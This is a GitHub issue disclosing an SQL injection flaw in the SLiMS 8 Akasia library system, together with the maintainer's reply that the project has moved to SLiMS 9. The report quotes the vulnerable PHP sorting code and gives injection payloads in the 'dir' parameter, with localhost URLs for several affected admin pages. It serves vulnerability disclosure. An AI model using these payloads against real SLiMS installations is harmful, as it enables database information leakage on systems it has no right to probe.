### **[qmss](/qmss)** commented [Dec 21, 2021](#issue-1085505912)

| Hello, I found some serious bugs in Slims8 Akasia 8.3.1 (latest version). First of all, there is a SQL injection bug. This injection exists in multiple files, and the file where the search keyword $\_GET['dir'] is located all has SQL injection. url:[http://localhost/admin/modules/bibliography/index.php?itemID=17&detail=true&ajaxload=1&datatablefld=ISBN%2FISSN&dir=asc](url)  `// change the record sorting if there fld var in URL $_fld_sort = $this->table_ID.'fld'; $_dir = 'ASC'; $_next_dir = 'DESC'; $_sort_dir_info = __('ascendingly'); if (isset($_GET[$_fld_sort]) AND !empty($_GET[$_fld_sort])) { $this->sql_order = 'ORDER BY`'.urldecode($\_GET[$\_fld\_sort]).'`'; // record order direction if (isset($_GET['dir']) AND ($_dir = trim($_GET['dir']))) { if ($_dir == 'DESC') { $_next_dir = 'ASC'; } else { $_next_dir = 'DESC'; $_sort_dir_info = __('descendingly'); } // append sort direction $this->sql_order .= $_dir; } }` You have escaped the dir string. But in fact it just appends a backslash \ before', "or . Reference from PHP mysql\_real\_escape\_string Therefore, if my GET variable dir does not contain these characters, sql injection will be triggered. SQL injection demonstration `dir=-test() //When the data table test does not exist, the database name is returned. slims.test` SQL injection demonstration `dir=-user() //When the data table user exists, it returns to the normal page.`  Example: [http://localhost/admin/modules/bibliography/index.php?itemID=17&detail=true&ajaxload=1&datatablefld=ISBN%2FISSN&dir=-a()](url)  [1](https://user-images.githubusercontent.com/18564938/146883462-3c9aa8b1-f197-4598-a8ed-913643b8dc4e.png)  [2](https://user-images.githubusercontent.com/18564938/146883650-8d61382e-a0df-473e-acf7-7ec343f536b6.png) List some pages with SQL injection: `http://localhost/admin/modules/bibliography/index.php?itemID=17&detail=true&ajaxload=1&datatablefld=ISBN%2FISSN&dir=-test() http://localhost/admin/modules/membership/member\_type.php?ajaxload=1&datatablefld=Loan+Limit&dir=DESC http://localhost/admin/modules/system/user\_group.php?keywords=&datatablefld=Group+Name&dir=DESC http://localhost/admin/modules/membership/index.php?datatablefld=Member+ID&dir=DESC` |

| Thank you for your reporting. By the way we don't develop slims8akasia project anymore. Now, we already moved to Slims 9 with code name Bulian. Please visit our new project in here <https://github.com/slims/slims9_bulian/releases> |
